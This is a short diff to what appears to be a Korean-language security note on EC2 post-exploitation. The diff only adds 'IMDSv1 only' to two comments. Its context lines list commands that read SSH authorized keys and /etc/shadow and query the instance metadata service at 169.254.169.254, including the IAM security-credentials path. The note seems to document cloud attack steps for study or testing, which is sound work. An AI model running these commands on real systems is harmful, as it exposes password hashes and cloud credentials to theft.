@@ -48,12 +48,12 @@ cat /home/ec2-user/.ssh/authorized_keys  # SSH 공개키 확인
 cat /etc/shadow          # 패스워드 해시 열람 시도
 cat /etc/hosts           # 로컬 호스트 정보
 
-# 기본 메타데이터 접근
+# 기본 메타데이터 접근 (IMDSv1 만 해당)
 curl http://169.254.169.254/
 curl http://169.254.169.254/latest/
 curl http://169.254.169.254/latest/meta-data
 
-# IAM 정보 및 보안 자격 증명 확인
+# IAM 정보 및 보안 자격 증명 확인 (IMDSv1 만 해당)
 curl http://169.254.169.254/latest/meta-data/iam/info
 curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
 ```
